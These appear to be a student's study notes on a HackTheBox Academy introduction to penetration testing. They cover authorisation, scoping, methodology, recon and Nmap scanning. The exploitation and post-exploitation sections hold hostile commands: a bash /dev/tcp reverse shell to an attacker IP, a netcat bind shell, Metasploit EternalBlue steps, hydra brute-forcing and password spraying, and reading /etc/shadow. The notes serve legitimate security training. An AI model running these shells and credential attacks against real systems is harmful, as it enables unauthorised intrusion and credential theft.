# Introduction To Penetration Testing — HackTheBox Academy

**Module:** Introduction To Penetration Testing
**Platform:** HackTheBox Academy
**Path:** Junior Cybersecurity Analyst (CJCA)
**Status:** ✅ Completed
**Completed:** July 2026

---

## Overview

Introduction To Penetration Testing establishes the methodology, mindset, and process behind ethical hacking. It answers the fundamental questions: what is a penetration test, why do organisations pay for them, how are they structured, what phases does a tester move through, and what does a professional engagement actually look like from start to finish.

This module sits at the intersection of everything covered so far — networking, protocols, web applications, and information security — and shows how all of that knowledge gets applied offensively in a structured, legal, and professional context.

Penetration testing is not hacking. It is **authorised, structured, goal-oriented security assessment** that simulates what a real attacker would do — before a real attacker does it.

---

## 1. What Is Penetration Testing?

**Penetration Testing (Pentesting)** is a proactive security assessment where a skilled professional — acting like an attacker — attempts to identify and exploit vulnerabilities in systems, networks, applications, and processes within a defined scope and with explicit authorisation.

It encompasses a wide range of tasks:

- **Reconnaissance / Information Gathering** — discovering targets and attack surface
- **Vulnerability Assessment** — identifying weaknesses
- **Exploitation** — attempting to leverage those weaknesses
- **Post-Exploitation** — determining what an attacker could do after initial access
- **Reporting** — documenting findings with context, evidence, and remediation guidance

### Penetration Testing vs Vulnerability Assessment

These are often confused but are distinct activities:

|                    | Vulnerability Assessment | Penetration Testing                |
| ------------------ | ------------------------ | ---------------------------------- |
| **Goal**           | Find vulnerabilities     | Find AND exploit vulnerabilities   |
| **Depth**          | Wide, automated scanning | Deep, manual, targeted             |
| **Exploitation**   | No                       | Yes — controlled                   |
| **Output**         | List of vulnerabilities  | Attack narrative + business impact |
| **Skill required** | Lower                    | Higher                             |

A vulnerability assessment tells you what might be broken. A penetration test proves it is broken and shows what an attacker could do with it.

---

## 2. Goals of Penetration Testing

### Primary Goals

**Evaluation of the organisation's cybersecurity posture**
Provides an objective, real-world assessment of how an organisation's defences hold up against a simulated attack. Not a checkbox — a genuine test.

**Testing the organisation's defensive measures**
Validates whether security controls (firewalls, IDS/IPS, EDR, access controls) actually work in practice — not just in theory or on paper.

**Operational and financial impact risk assessment**
Demonstrates the real-world business consequences of a successful attack — data exposure, service disruption, financial loss, regulatory penalties — so leadership can make informed risk decisions.

### Specific Objectives

| Objective                                          | Description                                                      |
| -------------------------------------------------- | ---------------------------------------------------------------- |
| **Identifying security weaknesses**                | Find vulnerabilities before attackers do                         |
| **Validating security controls**                   | Confirm that controls work as intended                           |
| **Testing detection and response capabilities**    | Does the Blue Team detect the Red Team? How fast?                |
| **Assessing real-world impact**                    | What could an attacker actually do with access?                  |
| **Prioritising remediation efforts**               | Not all vulnerabilities are equal — what needs fixing first?     |
| **Compliance and due diligence**                   | Many regulations (PCI-DSS, ISO 27001) require regular pentesting |
| **Enhancing security awareness**                   | Findings educate developers and administrators                   |
| **Verifying patch management**                     | Are patches applied correctly and completely?                    |
| **Testing new technologies**                       | Assess security of new systems before they go live               |
| **Providing a baseline for security improvements** | Measure progress over time with repeat assessments               |

---

## 3. The Legal and Ethical Framework

Penetration testing is legal only because it is explicitly authorised. Without authorisation, the same actions constitute criminal offences under computer crime laws in every jurisdiction.

### What Makes Pentesting Legal

**Written Authorisation** — a legally binding document (the Rules of Engagement or Statement of Work) signed by an authorised representative of the organisation explicitly permitting the tester to perform specified activities against specified targets.

**Defined Scope** — the exact systems, networks, IP ranges, and applications the tester is permitted to test. Anything outside scope is off-limits regardless of what the tester discovers.

**Defined Timeline** — testing is authorised during specific time windows. Outside those windows, activity is unauthorised.

### Key Legal Concepts

**Get-out-of-jail letter** — a physical letter from the client confirming authorisation, carried by the pentester during on-site engagements in case they are questioned by law enforcement or security personnel.

**Responsible disclosure** — if a tester discovers a vulnerability in a third-party system or software during an engagement, they have an ethical obligation to report it to the affected vendor through proper channels — not exploit it or publish it publicly without coordination.

**Relevant legislation (examples):**

- **UK:** Computer Misuse Act 1990
- **USA:** Computer Fraud and Abuse Act (CFAA)
- **Nigeria:** Cybercrimes (Prohibition, Prevention, Etc.) Act 2015
- **EU:** Directive on Attacks Against Information Systems

The legal framework exists to protect both the client and the tester. A pentester operating outside their authorised scope — even accidentally — can face criminal prosecution.

---

## Key Takeaways — Section 1

- Penetration testing is authorised, structured simulation of real attacks — without authorisation, it is a crime
- The goal is not just to find vulnerabilities but to prove they are exploitable and demonstrate real business impact
- Vulnerability assessment finds weaknesses; penetration testing proves them and shows their consequences
- Written authorisation and defined scope are non-negotiable — scope creep into unauthorised systems has legal consequences
- Pentesting serves multiple purposes simultaneously — security improvement, compliance, risk quantification, and awareness

---

## 4. Types of Penetration Tests

Penetration tests are categorised in two ways — by the amount of information the tester is given before starting, and by the perspective from which the test is conducted.

### By Information Level

**Black Box Testing**
The tester is given no prior information about the target. No network diagrams, no credentials, no source code, no internal documentation. The tester starts from zero — exactly as an external attacker would.

- Simulates a real external attacker with no insider knowledge
- Most realistic simulation of an opportunistic attack
- Time-consuming — significant time spent on reconnaissance
- May miss vulnerabilities that would only be found with internal knowledge

**White Box Testing**
The tester is given full information — network diagrams, source code, credentials, architecture documentation, everything. Complete transparency.

- Most thorough — tester can assess every component
- Simulates a malicious insider or a scenario where the attacker has already obtained internal information
- Most efficient use of testing time
- Less realistic as an external attack simulation

**Grey Box Testing**
The tester is given partial information — typically some credentials, a network range, or basic architecture knowledge — but not full visibility.

- Balance between realism and efficiency
- Simulates a scenario where an attacker has obtained limited information (e.g. through a phishing attack or data breach)
- Most commonly used in real-world engagements
- Based on the amount and type of information provided

### By Perspective

**External Testing**
Conducted from outside the organisation's network — simulating an internet-based attacker. Targets internet-facing assets: web applications, VPNs, email servers, DNS, public-facing APIs.

**Internal Testing**
Conducted from inside the organisation's network — simulating a malicious insider, a compromised employee, or an attacker who has already achieved initial access. Targets internal systems, Active Directory, internal web applications, network segments.

**Summary:**

| Type      | Information Given | Simulates                              |
| --------- | ----------------- | -------------------------------------- |
| Black Box | None              | External attacker from scratch         |
| Grey Box  | Partial           | Attacker with limited prior knowledge  |
| White Box | Full              | Insider or post-breach scenario        |
| External  | —                 | Internet-based attacker                |
| Internal  | —                 | Insider / post-initial-access attacker |

---

## 5. Rules of Engagement (RoE)

The **Rules of Engagement** is the foundational document of any penetration testing engagement. It defines the legal, operational, and technical boundaries of the test before a single packet is sent.

### Key RoE Components

**Scope Definition**
Explicitly lists what is in scope and what is out of scope:

- In-scope IP ranges, domains, applications
- Out-of-scope systems (e.g. third-party hosted services, production databases)
- Whether social engineering is permitted
- Whether physical testing is included

**Testing Windows**
The exact dates and times during which testing is authorised. Testing outside these windows is unauthorised — even against in-scope targets.

**Communication Plan**

- Primary and emergency contacts on the client side
- Escalation procedure if a critical vulnerability is found during testing
- What to do if the tester accidentally causes an outage
- How findings are communicated during the engagement

**Authorised Techniques**
Explicitly lists what is permitted:

- Scanning types (aggressive vs stealth)
- Whether exploitation is permitted
- Whether denial-of-service testing is included
- Whether credential attacks are permitted

**Emergency Stop Conditions**
Conditions under which the tester must immediately halt all activity — e.g. discovery of evidence of an active breach by a third party, accidental system outage, client request to pause.

---

## 6. Scoping and Pre-Engagement

Before testing begins, the pre-engagement phase establishes everything needed for a professional, controlled engagement.

### Pre-Engagement Activities

**Kickoff Meeting**
Initial meeting between the pentesting team and the client to align on objectives, constraints, and expectations. Establishes the working relationship and clarifies any ambiguities before the Statement of Work is finalised.

**Scope Definition**
The most critical pre-engagement activity. Defines:

- Target systems (IP ranges, domains, applications)
- Testing type (black/grey/white box, external/internal)
- Testing timeframe
- Out-of-scope systems and restrictions

**Questionnaire / Information Gathering**
Client provides information relevant to the engagement:

- Network diagrams (white/grey box)
- Credentials for authenticated testing
- Known vulnerabilities or recent changes to the environment
- Critical systems that must not be disrupted

**Statement of Work (SoW)**
The formal legal contract covering:

- Scope of work
- Deliverables (report format, presentation)
- Timeline and milestones
- Payment terms
- Liability limitations
- Confidentiality obligations

**Non-Disclosure Agreement (NDA)**
Protects both parties — the client's sensitive information stays with the tester, and the tester's methodologies are protected from public disclosure.

### Threat Modelling

Before testing begins, effective pentesters model the threats relevant to the client:

- **Who** would realistically attack this organisation? (Nation-state, cybercriminal, insider, hacktivist)
- **What** are they after? (Financial data, intellectual property, service disruption)
- **How** would they approach it? (External attack, phishing, supply chain)

This shapes the testing approach — a bank faces different realistic threats than a healthcare provider or a manufacturing plant.

---

## Key Takeaways — Section 2

- Black box = no information (most realistic), white box = full information (most thorough), grey box = partial (most common in practice)
- External testing simulates internet-based attackers; internal testing simulates insiders or post-compromise scenarios
- Rules of Engagement are the legal foundation of every engagement — scope, timing, techniques, and emergency contacts must all be defined before testing starts
- Scope creep into out-of-scope systems — even accidentally — has legal consequences; always verify before touching anything new
- The Statement of Work is the binding contract; the NDA protects both parties
- Threat modelling before testing shapes the approach — who realistically attacks this client, and how?

---

## 7. The Penetration Testing Methodology

A penetration test follows a structured sequence of phases. Each phase builds on the previous one — you cannot exploit what you haven't enumerated, and you cannot enumerate what you haven't discovered.

```
Pre-Engagement
     │
     ▼
Reconnaissance / Information Gathering
     │
     ▼
Scanning & Enumeration
     │
     ▼
Vulnerability Assessment
     │
     ▼
Exploitation
     │
     ▼
Post-Exploitation
     │
     ▼
Reporting
```

---

## 8. Phase 1 — Reconnaissance / Information Gathering

**Reconnaissance** is the process of collecting as much information about the target as possible before active testing begins. The more you know about the target, the more targeted and effective your attack surface mapping will be.

Reconnaissance is divided into two types:

### Passive Reconnaissance (OSINT)

Gathering information without directly interacting with the target. Uses publicly available sources — the target never knows you are looking.

**Sources:**

- **WHOIS** — domain registration information, registrant details, nameservers
- **DNS records** — A, MX, NS, TXT, CNAME records revealing infrastructure
- **Google Dorking** — advanced search operators to find exposed files, login pages, sensitive information indexed by Google
- **Shodan / Censys** — search engines for internet-connected devices — reveals open ports, services, and banners without scanning the target directly
- **LinkedIn / social media** — employee names, job titles, technologies used (job postings reveal tech stack)
- **GitHub / GitLab** — leaked credentials, API keys, internal code accidentally pushed to public repositories
- **Wayback Machine** — archived versions of websites revealing old endpoints, technologies, and content
- **Certificate Transparency logs** — reveals subdomains via SSL certificate history (`crt.sh`)
- **theHarvester** — automated OSINT tool for emails, subdomains, IPs from public sources

**Key OSINT principle:** Every piece of public information is a potential attack vector. Job postings that list specific software versions, LinkedIn profiles that reveal internal team structure, and GitHub commits that expose API keys are all real findings from real engagements.

### Active Reconnaissance

Directly interacting with the target systems to gather information. The target may detect this activity.

**Techniques:**

- **DNS enumeration** — querying DNS for records, attempting zone transfers
- **Port scanning** — identifying open ports and services (Nmap)
- **Web crawling** — spidering web applications for endpoints, parameters, and content
- **Banner grabbing** — connecting to services to read their version banners

```bash
# DNS zone transfer attempt
dig axfr @<nameserver> <domain>

# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Banner grabbing with netcat
nc <target IP> 80
HEAD / HTTP/1.0
```

---

## 9. Phase 2 — Scanning & Enumeration

Once the attack surface is mapped, scanning and enumeration go deeper — identifying exactly what is running, what version it is, and how it is configured.

### Network Scanning with Nmap

**Nmap** is the primary tool for network scanning. It identifies open ports, running services, service versions, and operating systems.

**Essential Nmap scan types:**

```bash
# Host discovery — which hosts are alive
nmap -sn 192.168.1.0/24

# SYN scan — stealthy, fast, requires root
nmap -sS <target IP>

# Full TCP connect scan — no root required
nmap -sT <target IP>

# UDP scan — slower, identifies UDP services
nmap -sU <target IP>

# Service and version detection
nmap -sV <target IP>

# OS fingerprinting
nmap -O <target IP>

# Aggressive scan — OS, version, scripts, traceroute
nmap -A <target IP>

# Specific port scan
nmap -p 22,80,443,445,3389 <target IP>

# All ports
nmap -p- <target IP>

# Script scan — NSE scripts
nmap --script smb-enum-shares,smb-vuln-ms17-010 <target IP>
```

**Host enumeration — after discovering a host:**

After scanning, for each discovered host we want to gather:

- Open ports — what is listening
- Service versions — what software and version is running
- Information — OS, hostname, domain membership
- Operational status — is the service actually functional

**There are two port states of particular importance:**

- **Open** — actively accepting connections — a service is running
- **Filtered** — a firewall is blocking the probe — the port may or may not be open

### Service Enumeration

After identifying open ports, enumerate each service specifically:

**SMB Enumeration (port 445)**

```bash
# List shares
smbclient -L //<target IP> -N

# Enumerate with enum4linux
enum4linux -a <target IP>

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery <target IP>
```

**HTTP/HTTPS Enumeration (ports 80/443)**

```bash
# Directory brute-forcing
gobuster dir -u http://<target IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Nikto web vulnerability scanner
nikto -h http://<target IP>

# whatweb — identify technologies
whatweb http://<target IP>
```

**FTP Enumeration (port 21)**

```bash
# Test anonymous login
ftp <target IP>
# Username: anonymous
# Password: (blank)
```

**SNMP Enumeration (port 161 UDP)**

```bash
snmpwalk -v2c -c public <target IP>
```

**SSH Enumeration (port 22)**

```bash
# Banner grab
nc <target IP> 22

# Check supported auth methods
ssh -v user@<target IP>
```

### Vulnerability Identification

After enumeration, map findings to known vulnerabilities:

- Check service versions against CVE databases (NVD, Exploit-DB)
- Run Nmap NSE vulnerability scripts
- Use automated scanners (Nessus, OpenVAS) for comprehensive coverage
- Search Metasploit for available modules: `search <service name>`

---

## Key Takeaways — Section 3

- Reconnaissance comes before everything — the more you know before active testing, the more targeted and effective your attacks
- Passive recon (OSINT) leaves no trace on the target — always exhaust passive sources before going active
- GitHub is consistently one of the highest-yield OSINT sources — leaked credentials and API keys appear regularly
- Nmap is the foundation of network scanning — know the key flags (`-sS`, `-sV`, `-O`, `-A`, `-p-`) and when to use each
- Enumeration is not scanning — scanning finds open ports, enumeration pulls specific information from those services
- Every open port is a question — what is running, what version, does it have known vulnerabilities, can I authenticate to it
- Map service versions to CVEs before attempting manual exploitation — public exploits often exist and save significant time

---

## 10. Phase 3 — Exploitation

**Exploitation** is the phase where identified vulnerabilities are actively leveraged to gain unauthorised access to systems, escalate privileges, or demonstrate impact. It is the proof — not just that a vulnerability exists, but that it is exploitable and what the consequences are.

Exploitation is never the goal in itself. The goal is to demonstrate real-world business impact — what could an attacker actually do if they reached this point?

### Exploitation Approaches

**Known Exploit (CVE-based)**
Using a publicly documented exploit for a known vulnerability in a specific software version. The most reliable path when available.

```bash
# Search for exploits in Metasploit
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set RHOSTS <target IP>
msf6 exploit > set LHOST <attacker IP>
msf6 exploit > run
```

```bash
# Search Exploit-DB from command line
searchsploit apache 2.4.49
searchsploit -m <exploit ID>   # copy exploit locally
```

**Manual Exploitation**
When no public exploit exists or automation fails — manually craft payloads, manipulate requests, or chain vulnerabilities together.

Examples:

- SQL injection manually extracted via `sqlmap` or raw payloads
- Authentication bypass via logic flaws
- File upload bypass — MIME type manipulation, double extension, null byte injection

**Password Attacks**
Gaining access through credential attacks:

```bash
# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target IP>

# Password spray — one password, many users
hydra -L users.txt -p Password123 smb://<target IP>

# Hash cracking with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hash cracking with Hashcat (GPU)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### Establishing a Foothold

Once initial access is achieved, the tester establishes a stable, persistent connection to the compromised system:

**Reverse Shell** — the target connects back to the attacker's machine:

```bash
# Attacker listens
nc -lvnp 4444

# Payload executed on target (bash)
bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
```

**Bind Shell** — the attacker connects to a listener on the target:

```bash
# Target listens
nc -lvnp 4444 -e /bin/bash

# Attacker connects
nc <target IP> 4444
```

**Meterpreter** — Metasploit's advanced payload providing a feature-rich interactive shell with built-in post-exploitation modules.

### Shell Stabilisation

Raw shells are unstable — they lack tab completion, job control, and proper TTY. Stabilise immediately after catching a shell:

```bash
# Python TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then background with Ctrl+Z
stty raw -echo; fg

# Set terminal size
export TERM=xterm
stty rows 38 columns 116
```

---

## 11. Phase 4 — Post-Exploitation

**Post-exploitation** begins after initial access is established. The goal shifts from getting in to understanding the full impact of that access — what can be done, what can be reached, and how far the compromise can extend.

This phase simulates what a real attacker would do after initial foothold — and its findings often represent the most critical findings in a report.

### Local Enumeration

After gaining access to a system, enumerate the local environment:

```bash
# Current user and privileges
whoami
id
sudo -l                    # what can this user run as root?

# System information
uname -a                   # kernel version
cat /etc/os-release        # OS details
hostname

# Network information
ifconfig / ip a            # interfaces and IPs
netstat -tulnp             # listening services
ip route                   # routing table
cat /etc/hosts             # local hostname resolution

# Users and groups
cat /etc/passwd            # all users
cat /etc/shadow            # password hashes (if root)
groups                     # current user's groups

# Running processes and services
ps aux
systemctl list-units --type=service

# Interesting files
find / -name "*.conf" 2>/dev/null
find / -perm -4000 2>/dev/null    # SUID binaries
find / -writable 2>/dev/null       # writable files/dirs
```

### Privilege Escalation

**Privilege escalation** is the process of gaining higher privileges than initially obtained — typically moving from a low-privilege user to root (Linux) or SYSTEM/Administrator (Windows).

**Common Linux privilege escalation vectors:**

| Vector                     | Description                                                                               |
| -------------------------- | ----------------------------------------------------------------------------------------- |
| **Sudo misconfigurations** | `sudo -l` reveals commands the user can run as root without a password                    |
| **SUID binaries**          | Executables that run as the file owner (root) — can be abused to execute commands as root |
| **Writable cron jobs**     | Cron jobs running as root with scripts writable by the current user                       |
| **Kernel exploits**        | Outdated kernel with a known local privilege escalation CVE                               |
| **Writable /etc/passwd**   | Can add a new root user directly                                                          |
| **PATH hijacking**         | Script running as root calls a binary without full path — attacker controls PATH          |
| **Docker/LXC group**       | Members of docker group have effective root access                                        |

**Tools:** LinPEAS, LinEnum, linux-exploit-suggester — automated scripts that enumerate privilege escalation vectors.

**Common Windows privilege escalation vectors:**

- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Token impersonation (Juicy Potato, PrintSpoofer)
- Credential dumping (Mimikatz — LSASS)

### Lateral Movement

**Lateral movement** is the process of moving from one compromised system to others within the network — expanding the foothold and reaching higher-value targets.

**Techniques:**

- **Pass-the-Hash** — use captured NTLM hashes to authenticate to other Windows systems without the plaintext password
- **SSH key reuse** — private keys found on one system often work on others
- **Credential reuse** — credentials found in config files, environment variables, or memory often work on multiple systems
- **Network pivoting** — use the compromised host as a proxy to reach otherwise unreachable internal network segments

```bash
# SSH pivoting — access internal network through compromised host
ssh -L 8080:<internal target>:80 user@<compromised host>

# Dynamic SOCKS proxy through compromised host
ssh -D 1080 user@<compromised host>
proxychains nmap <internal target>
```

### Data Exfiltration Simulation

Demonstrate what data an attacker could steal — without actually exfiltrating real sensitive data:

- Identify sensitive files (credentials, customer data, intellectual property)
- Document what was accessible and what the business impact would be
- Capture screenshots as evidence

---

## Key Takeaways — Section 4

- Exploitation proves a vulnerability is real and exploitable — the goal is demonstrating business impact, not just getting access
- Metasploit and searchsploit are the first tools to check for known CVE exploits — manual exploitation is the fallback
- Always stabilise shells immediately after catching them — unstable shells get lost and waste time
- Post-exploitation is where the most critical findings come from — what can an attacker do after they get in?
- Privilege escalation moves from low to high privilege — sudo misconfiguration and SUID binaries are the most common Linux vectors
- Lateral movement expands the compromise across the network — Pass-the-Hash and credential reuse are the most reliable techniques
- Network pivoting reaches internal systems through a compromised host — SSH tunnelling and SOCKS proxies are the primary tools
